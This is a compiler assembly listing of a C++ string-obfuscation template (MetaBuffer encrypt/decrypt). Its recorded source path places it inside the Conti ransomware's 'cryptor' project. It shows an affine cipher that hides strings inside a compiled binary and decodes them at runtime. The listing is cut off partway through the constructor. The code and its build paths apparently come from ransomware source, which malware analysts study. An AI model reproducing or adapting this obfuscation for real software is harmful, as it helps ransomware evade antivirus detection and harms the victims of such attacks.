;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 36	 cmp	 QWORD PTR i$1[rbp], 54	; 00000036H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv476 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
